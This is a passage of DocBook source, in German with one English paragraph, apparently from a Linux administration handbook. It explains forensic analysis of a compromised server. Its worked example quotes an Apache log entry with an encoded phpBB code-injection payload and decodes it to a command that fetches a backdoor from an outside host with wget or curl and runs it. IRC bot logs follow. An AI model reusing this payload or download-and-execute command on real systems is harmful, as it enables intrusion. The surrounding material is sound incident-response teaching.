				Es ist nicht immer einfach, einen entfernten Server neu zu installieren; hierzu kann es erforderlich sein, Unterstützung vom Hosting-Unternehmen zu bekommen, da nicht alle derartigen Unternehmen automatische Reinstallationssysteme anbieten. Es sollte darauf geachtet werden, den Rechner nicht von Sicherheitskopien zu reinstallieren, die nach dem Beginn der Kompromittierung gezogen worden sind. Idealerweise sollten nur Daten wiederhergestellt werden, wohingegen die eigentliche Software von den Installationsmedien neu installiert wird.
			</para>

		</section>
		 <section id="sect.forensic-analysis">
			<title>Forensische Analyse</title>
			 <para>
				Nun, da der Betrieb wiederhergestellt ist, ist es an der Zeit, sich die Abbilder des kompromittierten Systems genauer anzusehen, um den Angriffsvektor zu verstehen. Beim Einhängen dieser Abbilder sollte darauf geachtet werden, dass die Optionen <literal>ro,nodev,noexec,noatime</literal> verwendet werden, um zu verhindern, dass der Inhalt verändert wird (einschließlich der Zeitstempel für den Zugriff auf Dateien) oder versehentlich kompromittierte Programme ausgeführt werden.
			</para>
			 <para>
				Ein Angriffsszenarium zurückzuverfolgen bedeutet gewöhnlich, nach allem Ausschau zu halten, das verändert und ausgeführt wurde:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						<filename>.bash_history</filename>-Dateien stellen häufig eine sehr interessante Lektüre dar;
					</para>

				</listitem>
				 <listitem>
					<para>
						das Gleiche gilt für Dateien, die vor kurzem erstellt, verändert oder angesteuert wurden;
					</para>

				</listitem>
				 <listitem>
					<para>
						der Befehl <command>strings</command> hilft dabei, vom Angreifer installierte Programme zu identifizieren, indem er Textstrings aus einer Binärdatei extrahiert;
					</para>

				</listitem>
				 <listitem>
					<para>
						die Protokolldateien in <filename>/var/log/</filename> ermöglichen es oft, eine Chronologie der Ereignisse zu rekonstruieren;
					</para>

				</listitem>
				 <listitem>
					<para>
						Spezialprogramme ermöglichen es auch, den Inhalt von Dateien wiederherzustellen, die möglicherweise gelöscht worden sind, einschließlich der Protokolldateien, die Angreifer häufig löschen.
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Some of these operations can be made easier with specialized software. In particular, the <emphasis role="pkg">sleuthkit</emphasis> package provides many tools to analyze a filesystem. Their use is made easier by the <emphasis>Autopsy Forensic Browser</emphasis> graphical interface (in the <emphasis role="pkg">autopsy</emphasis> package).
			</para>
			 <indexterm>
				<primary>Autopsy Forensic Browser</primary>
			</indexterm>
			 <indexterm>
				<primary>The Sleuth Kit</primary>
			</indexterm>

		</section>
		 <section id="sect.reconstituting-the-attack-scenario">
			<title>Das Angriffsszenarium wiederherstellen</title>
			 <para>
				Alle während der Analyse gesammelten Elemente sollten wie die Teile eines Puzzles zueinander passen; die Erstellung der ersten verdächtigen Dateien steht häufig mit Protokollen in Zusammenhang, die den Einbruch bekunden. Ein Beispiel aus dem Alltag sollte deutlicher sein, als langes theoretisches Gerede.
			</para>
			 <para>
				Das folgende Protokoll ist ein Auzug aus einer Apache <filename>access.log</filename>-Datei:
			</para>
			 
<programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
</programlisting>
			 <para>
				Dieses Beispiel entspricht einer alten Sicherheitslücke in phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />
			</para>
			 <para>
				Das Entschlüsseln dieser langen URL führt zu der Erkenntnis, dass es dem Angreifer gelungen ist, einigen PHP-Code auszuführen, nämlich: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. In der Tat wurde eine <filename>bd</filename>-Datei in <filename>/tmp/</filename> gefunden. Wenn man <command>strings /mnt/tmp/bd</command> ausführt, ergibt sich unter anderem der String <literal>PsychoPhobia Backdoor is starting...</literal>. Dies sieht wirklich nach einer Hintertür aus.
			</para>
			 <para>
				Einige Zeit später wurde dieser Zugang dazu benutzt, einen IRC-<emphasis>Bot</emphasis> herunterzuladen, zu installieren und auszuführen, der sich mit einem IRC-Untergrundnetzwerk verbunden hat. Der Bot konnte dann über dieses Protokoll gesteuert und angewiesen werden, Dateien zum Tausch herunterzuladen. Dieses Programm hat sogar seine eigene Programmdatei:
			</para>
			 
<programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)
</programlisting>
			 <para>
				Diese Spuren zeigen, dass über die IP-Adresse 82.50.72.202 zwei Videodateien auf dem Server gespeichert wurden.
			</para>
			 <para>
				Gleichzeitig hat der Angreifer einige zusätzliche Dateien heruntergeladen: <filename>/tmp/pt</filename> und <filename>/tmp/loginx</filename>. Lässt man diese Dateien durch <command>strings</command> laufen, so ergeben sich Strings wie <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> und <foreignphrase>Now wait for suid shell...</foreignphrase>. Diese sehen wie Programme aus, die lokale Schwachstellen ausnutzen, um Administratorrechte zu erlangen. Haben sie ihr Ziel erreicht? In diesem Fall vermutlich nicht, da anscheinend keine Datei nach dem ursprünglichen Einbruch verändert worden ist.
			</para>
			 <para>
				In diesem Beispiel wurde der gesamte Einbruch rekonstruiert, und es kann daraus geschlossen werden, dass der Angreifer in der Lage war, das kompromittierte System etwa drei Tage lang zu nutzen; aber das wichtigste Element der Analyse ist, dass die Schwachstelle identifiziert worden ist, und dass der Administrator sicher sein kann, dass die neue Installation diese Schwachstelle tatsächlich behebt.
			</para>

		</section>

	</section>
</chapter>

